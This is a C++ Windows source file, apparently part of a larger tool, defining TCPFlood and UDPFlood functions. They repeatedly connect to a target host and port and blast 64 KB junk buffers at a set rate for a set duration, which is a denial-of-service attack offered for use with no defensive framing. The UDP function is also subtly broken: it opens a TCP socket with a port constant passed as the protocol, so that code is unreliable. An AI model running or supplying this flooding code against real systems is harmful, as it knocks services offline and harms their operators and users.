#include "Un-main.h"
//#include "hand file/Socket/Sockets.h"

#ifndef SOCKETS_H
#define SOCKETS_H

#include <ws2tcpip.h>
//#include <winsock2.h>
//#pragma comment(lib, "ws2_32.lib")

#endif

bool GetSocketAddress(char* host, sockaddr_in* address)
{
	struct addrinfo* result = NULL;
	struct addrinfo* ptr = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(host, "http", &hints, &result)) return false;

	*address = *(sockaddr_in*)(result[0].ai_addr);
	freeaddrinfo(result);
	return true;
}



void TCPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET s;

	char data[65536];
	memset(data, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == 0) continue;

		int cRes = connect(s, (sockaddr*)&input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			closesocket(s); continue;
		}
		send(s, data, 65536, 0);
		Sleep(10);
		send(s, data, 65536, 0);

		closesocket(s);
	}
}

void UDPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET c;

	char dat[65536];
	memset(dat, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		c = socket(AF_INET, SOCK_STREAM, IPPORT_BIFFUDP);
		if (c == 0) continue;
		int cRes = connect(c, (sockaddr*)&input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			closesocket(c); continue;
		}
		send(c, dat, 65536, 0);
		Sleep(10);
		send(c, dat, 65536, 0);

		closesocket(c);
	}
}


